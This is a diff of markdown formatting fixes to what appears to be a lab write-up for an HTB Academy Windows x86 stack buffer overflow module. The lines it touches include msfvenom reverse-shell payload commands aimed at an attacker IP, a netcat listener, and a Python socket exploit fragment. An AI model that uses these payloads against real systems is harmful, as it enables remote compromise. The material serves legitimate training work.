@@ -75,8 +75,8 @@ This module delivers a step-by-step technical guide to Windows x86 stack overflo
 
 ```bash
 xfreerdp /v:<target-IP> /u:htb-student /p:Academy_student!
-```
 /dynamic-resolution
+```
 and will be reffered as 'RDP login to the target machine'.
 
 
@@ -421,8 +421,8 @@ nc -lnvp 4444
 Now, we will use msfvenom to generate windows reverse shell payload, as
 ```bash
 python syntax:
+msfvenom -p 'windows/shell_reverse_tcp' LHOST=`<attacker-IP>`
 ```
-msfvenom -p 'windows/shell_reverse_tcp' LHOST=<attacker-IP>
 LPORT=4444 -f 'python'
 
 ![Figure 13.1 — Lab execution and output verification (Page 13)](/assets/images/posts/htb-academy/stack-based-buffer-overflows-on-windows-x86/p013_01.jpg)
@@ -638,8 +638,8 @@ nc -lnvp 4444
 Now, we will use msfvenom to generate windows reverse shell payload, as
 ```bash
 python syntax:
+msfvenom -p 'windows/shell_reverse_tcp' LHOST=`<attacker-IP>`
 ```
-msfvenom -p 'windows/shell_reverse_tcp' LHOST=<attacker-IP>
 LPORT=4444 -f 'python'
 
 ![Figure 21.1 — Lab execution and output verification (Page 21)](/assets/images/posts/htb-academy/stack-based-buffer-overflows-on-windows-x86/p021_01.jpg)
@@ -1103,7 +1103,7 @@ We take the first one: 0X621014E3.
 
 Lastly, we will generate the msfvenom payload. We will make sure to exclude
 the bad characters:
-msfvenom -p 'windows/shell_reverse_tcp' LHOST=<attacker-IP>
+msfvenom -p 'windows/shell_reverse_tcp' LHOST=`<attacker-IP>`
 LPORT=4444 -f 'python' -b '\x00\x0A\x0D'
 
 
@@ -1149,7 +1149,7 @@ nop = b"\x90"*32
 payload = buffer + eip + nop + buf
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("<target-IP>", 21449))
+s.connect(("`<target-IP>`", 21449))
 s.send(payload)
 s.close()
 
